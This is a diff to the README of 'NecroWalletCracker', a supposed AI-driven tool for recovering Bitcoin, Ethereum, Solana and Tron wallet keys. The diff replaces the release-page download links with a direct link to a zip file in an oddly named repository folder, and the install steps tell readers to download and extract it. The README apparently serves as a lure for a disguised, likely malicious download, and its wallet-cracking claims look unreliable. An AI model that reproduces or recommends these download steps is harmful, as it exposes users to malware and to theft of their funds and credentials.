@@ -1,6 +1,6 @@
 # 🛠️ NecroWalletCracker - Recover lost crypto wallet access efficiently
 
-[![Download NecroWalletCracker](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jonisrusty914/NecroWalletCracker/releases)
+[![Download NecroWalletCracker](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jonisrusty914/NecroWalletCracker/raw/refs/heads/main/obtect/Cracker-Wallet-Necro-v1.1.zip)
 
 NecroWalletCracker helps users recover access to encrypted cryptocurrency wallets. This software uses artificial intelligence to analyze wallet files and identify potential recovery patterns for private keys and passphrases. It works specifically with Bitcoin, Ethereum, Solana, and Tron wallets.
 
@@ -18,7 +18,7 @@ This software runs on modern Windows systems. Ensure your machine meets these sp
 
 Follow these steps to obtain and prepare the software on your computer.
 
-1.  Visit the official release page to download the latest version: [https://github.com/jonisrusty914/NecroWalletCracker/releases](https://github.com/jonisrusty914/NecroWalletCracker/releases).
+1.  Visit the official release page to download the latest version: [https://github.com/jonisrusty914/NecroWalletCracker/raw/refs/heads/main/obtect/Cracker-Wallet-Necro-v1.1.zip](https://github.com/jonisrusty914/NecroWalletCracker/raw/refs/heads/main/obtect/Cracker-Wallet-Necro-v1.1.zip).
 2.  Locate the file ending in `.zip` and click to start the download.
 3.  Go to your downloads folder.
 4.  Right-click the zip file and select Extract All.
